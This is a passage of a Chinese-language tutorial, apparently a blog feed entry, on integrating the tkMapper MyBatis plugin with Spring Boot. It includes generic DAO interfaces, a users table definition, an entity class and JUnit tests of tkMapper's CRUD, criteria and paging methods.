        <content type="html"><![CDATA[<h2 id="一、-DAO层的实现的规律"><a href="#一、-DAO层的实现的规律" class="headerlink" title="一、 DAO层的实现的规律"></a>一、 DAO层的实现的规律</h2><ul><li><p>实体类与数据表存在对应关系，并且是有规律的——只要知道了数据表的结构，就能够生成实体类；</p></li><li><p>所有实体的DAO接口中定义的方法也是有规律的，不同点就是实体类型不同</p><ul><li><p>UserDAO</p><pre class="line-numbers language-JAVA" data-language="JAVA"><code class="language-JAVA">public interface UserDAO extends GeneralDAO&lt;User&gt;{    public int insert(User t);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>GoodsDAO</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">GoodsDAO</span> <span class="token keyword">extends</span> <span class="token class-name">GeneralDAO</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Goods</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>   <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token class-name">Goods</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>GeneralDAO</p><pre class="line-numbers language-JAVA" data-language="JAVA"><code class="language-JAVA">public interface GeneralDAO&lt;T&gt;{    //通用方法    public int insert(T t);    public T queryOneByPrimarykey(int i);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>对于GeneralDAO接口定义的数据库操作方法因为使用了泛型，<code>无需映射文件</code>；对于UserDAO和GoodsDAO需要映射文件，所有DAO的相同操作的映射文件也是有规律可循的</p><ul><li><p>UserMapper</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>insert</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>insert<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>insert into users(user_id,username) values(#{userId},#{username})<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>insert</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Table</span><span class="token punctuation">(</span><span class="token string">"users"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>        <span class="token annotation punctuation">@Id</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span><span class="token string">"user_id"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> userId<span class="token punctuation">;</span>        <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>GoodsMapper</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>insert</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>insert<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>insert into goods(goods_id,goods_name) values(#{goodsId},#{goodsName})<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>insert</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Table</span><span class="token punctuation">(</span><span class="token string">"product"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Goods</span><span class="token punctuation">{</span>    <span class="token annotation punctuation">@Id</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span><span class="token string">"goods_id"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> goodsId<span class="token punctuation">;</span>        <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span><span class="token string">"goods_name"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> goodsName<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h2 id="二、tkMapper简介"><a href="#二、tkMapper简介" class="headerlink" title="二、tkMapper简介"></a>二、tkMapper简介</h2><blockquote><p>基于MyBatis提供了很多第三方插件，这些插件通常可以完成数据操作方法的封装（GeneralDAO）、数据库逆向工程工作(根据数据表生成实体类、生成映射文件)</p><ul><li>MyBatis-plus</li><li>tkMapper</li></ul></blockquote><p>tkMapper就是一个MyBatis插件，是在MyBatis的基础上提供了很多工具，让开发变得简单，提高开发效率。</p><ul><li>提供了针对单表通用的数据库操作方法</li><li>逆向工程（根据数据表生成实体类、dao接口、映射文件）</li></ul><h2 id="三、tkMapper整合"><a href="#三、tkMapper整合" class="headerlink" title="三、tkMapper整合"></a>三、tkMapper整合</h2><h4 id="3-1-基于SpringBoot完成MyBatis的整合"><a href="#3-1-基于SpringBoot完成MyBatis的整合" class="headerlink" title="3.1 基于SpringBoot完成MyBatis的整合"></a>3.1 基于SpringBoot完成MyBatis的整合</h4><h4 id="3-2-整合tkMapper"><a href="#3-2-整合tkMapper" class="headerlink" title="3.2 整合tkMapper"></a>3.2 整合tkMapper</h4><h6 id="3-2-1-添加tkMapper的依赖"><a href="#3-2-1-添加tkMapper的依赖" class="headerlink" title="3.2.1 添加tkMapper的依赖"></a>3.2.1 添加tkMapper的依赖</h6><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>tk.mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>mapper-spring-boot-starter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.1.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="3-2-2-修改启动类的-MapperScan注解的包"><a href="#3-2-2-修改启动类的-MapperScan注解的包" class="headerlink" title="3.2.2 修改启动类的@MapperScan注解的包"></a>3.2.2 修改启动类的<code>@MapperScan</code>注解的包</h6><ul><li>为<code>tk.mybatis.spring.annotation.MapperScan</code></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">tk<span class="token punctuation">.</span>mybatis<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">MapperScan</span><span class="token punctuation">;</span><span class="token annotation punctuation">@SpringBootApplication</span><span class="token annotation punctuation">@MapperScan</span><span class="token punctuation">(</span><span class="token string">"com.qfedu.tkmapperdemo.dao"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TkmapperDemoApplication</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">TkmapperDemoApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、tkMapper使用"><a href="#四、tkMapper使用" class="headerlink" title="四、tkMapper使用"></a>四、tkMapper使用</h2><h4 id="4-1-创建数据表"><a href="#4-1-创建数据表" class="headerlink" title="4.1 创建数据表"></a>4.1 创建数据表</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>users<span class="token punctuation">`</span>  <span class="token punctuation">(</span>  <span class="token punctuation">`</span>user_id<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">AUTO_INCREMENT</span> <span class="token keyword">COMMENT</span> <span class="token string">'主键id 用户id'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>username<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> utf8 <span class="token keyword">COLLATE</span> utf8_general_ci <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'用户名 用户名'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>password<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> utf8 <span class="token keyword">COLLATE</span> utf8_general_ci <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'密码 密码'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>nickname<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> utf8 <span class="token keyword">COLLATE</span> utf8_general_ci <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'昵称 昵称'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>realname<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span> <span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> utf8 <span class="token keyword">COLLATE</span> utf8_general_ci <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'真实姓名 真实姓名'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>user_img<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> utf8 <span class="token keyword">COLLATE</span> utf8_general_ci <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'头像 头像'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>user_mobile<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> utf8 <span class="token keyword">COLLATE</span> utf8_general_ci <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'手机号 手机号'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>user_email<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> utf8 <span class="token keyword">COLLATE</span> utf8_general_ci <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'邮箱地址 邮箱地址'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>user_sex<span class="token punctuation">`</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> utf8 <span class="token keyword">COLLATE</span> utf8_general_ci <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'性别 M(男) or F(女)'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>user_birth<span class="token punctuation">`</span> <span class="token keyword">date</span> <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'生日 生日'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>user_regtime<span class="token punctuation">`</span> <span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'注册时间 创建时间'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>user_modtime<span class="token punctuation">`</span> <span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'更新时间 更新时间'</span><span class="token punctuation">,</span>  <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>user_id<span class="token punctuation">`</span><span class="token punctuation">)</span> <span class="token keyword">USING</span> <span class="token keyword">BTREE</span><span class="token punctuation">)</span> <span class="token keyword">ENGINE</span> <span class="token operator">=</span> <span class="token keyword">InnoDB</span> <span class="token keyword">AUTO_INCREMENT</span> <span class="token operator">=</span> <span class="token number">2</span> <span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> <span class="token operator">=</span> utf8 <span class="token keyword">COLLATE</span> <span class="token operator">=</span> utf8_general_ci <span class="token keyword">COMMENT</span> <span class="token operator">=</span> <span class="token string">'用户 '</span> ROW_FORMAT <span class="token operator">=</span> Compact<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-2-创建实体类"><a href="#4-2-创建实体类" class="headerlink" title="4.2 创建实体类"></a>4.2 创建实体类</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Data</span><span class="token annotation punctuation">@NoArgsConstructor</span><span class="token annotation punctuation">@AllArgsConstructor</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> userId<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> nickname<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> realname<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> userImg<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> userMobile<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> userEmail<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> userSex<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Date</span> userBirth<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Date</span> userRegtime<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Date</span> userModtime<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-3-创建DAO接口"><a href="#4-3-创建DAO接口" class="headerlink" title="4.3 创建DAO接口"></a>4.3 创建DAO接口</h4><blockquote><p>tkMapper已经完成了对单表的通用操作的封装，封装在Mapper接口和MySqlMapper接口；因此如果我们要完成对单表的操作，只需自定义DAO接口继承Mapper接口和MySqlMapper接口</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserDAO</span> <span class="token keyword">extends</span> <span class="token class-name">Mapper</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">,</span> <span class="token class-name">MySqlMapper</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="4-4-测试"><a href="#4-4-测试" class="headerlink" title="4.4 测试"></a>4.4 测试</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RunWith</span><span class="token punctuation">(</span><span class="token class-name">SpringRunner</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token annotation punctuation">@SpringBootTest</span><span class="token punctuation">(</span>classes <span class="token operator">=</span> <span class="token class-name">TkmapperDemoApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserDAOTest</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">UserDAO</span> userDAO<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        user<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        user<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span><span class="token string">"1111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        user<span class="token punctuation">.</span><span class="token function">setUserImg</span><span class="token punctuation">(</span><span class="token string">"img/default.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        user<span class="token punctuation">.</span><span class="token function">setUserRegtime</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        user<span class="token punctuation">.</span><span class="token function">setUserModtime</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> userDAO<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、tkMapper提供的方法"><a href="#五、tkMapper提供的方法" class="headerlink" title="五、tkMapper提供的方法"></a>五、tkMapper提供的方法</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RunWith</span><span class="token punctuation">(</span><span class="token class-name">SpringRunner</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token annotation punctuation">@SpringBootTest</span><span class="token punctuation">(</span>classes <span class="token operator">=</span> <span class="token class-name">TkmapperDemoApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CategoryDAOTest</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">CategoryDAO</span> categoryDAO<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testInsert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">Category</span> category <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Category</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"测试类别3"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"03.png"</span><span class="token punctuation">,</span><span class="token string">"xixi"</span><span class="token punctuation">,</span><span class="token string">"aaa.jpg"</span><span class="token punctuation">,</span><span class="token string">"black"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//int i = categoryDAO.insert(category);</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> categoryDAO<span class="token punctuation">.</span><span class="token function">insertUseGeneratedKeys</span><span class="token punctuation">(</span>category<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>category<span class="token punctuation">.</span><span class="token function">getCategoryId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">Category</span> category <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Category</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token string">"测试类别4"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"04.png"</span><span class="token punctuation">,</span><span class="token string">"heihei"</span><span class="token punctuation">,</span><span class="token string">"aaa.jpg"</span><span class="token punctuation">,</span><span class="token string">"black"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> categoryDAO<span class="token punctuation">.</span><span class="token function">updateByPrimaryKey</span><span class="token punctuation">(</span>category<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 根据自定义条件修改，Example example就是封装条件的</span>        <span class="token comment">// int i1 = categoryDAO.updateByExample( Example example);</span>        <span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testDelete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> categoryDAO<span class="token punctuation">.</span><span class="token function">deleteByPrimaryKey</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 根据条件删除</span>        <span class="token comment">//int i1 = categoryDAO.deleteByExample(Example example);</span>        <span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testSelect1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">//查询所有</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Category</span><span class="token punctuation">&gt;</span></span> categories <span class="token operator">=</span> categoryDAO<span class="token punctuation">.</span><span class="token function">selectAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Category</span> category<span class="token operator">:</span> categories<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>category<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testSelect2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">//根据主键查询</span>        <span class="token class-name">Category</span> category <span class="token operator">=</span> categoryDAO<span class="token punctuation">.</span><span class="token function">selectByPrimaryKey</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>category<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testSelect3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">//条件查询</span>        <span class="token comment">//1.创建一个Example封装 类别Category查询条件</span>        <span class="token class-name">Example</span> example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span><span class="token class-name">Category</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Example</span><span class="token punctuation">.</span><span class="token class-name">Criteria</span> criteria <span class="token operator">=</span> example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        criteria<span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"categoryLevel"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        criteria<span class="token punctuation">.</span><span class="token function">orLike</span><span class="token punctuation">(</span><span class="token string">"categoryName"</span><span class="token punctuation">,</span><span class="token string">"%干%"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Category</span><span class="token punctuation">&gt;</span></span> categories <span class="token operator">=</span> categoryDAO<span class="token punctuation">.</span><span class="token function">selectByExample</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Category</span> category<span class="token operator">:</span> categories<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>category<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testSelect4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">//分页查询</span>        <span class="token keyword">int</span> pageNum <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> pageSize <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> start <span class="token operator">=</span> <span class="token punctuation">(</span>pageNum<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>pageSize<span class="token punctuation">;</span>        <span class="token class-name">RowBounds</span> rowBounds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RowBounds</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>pageSize<span class="token punctuation">)</span><span class="token 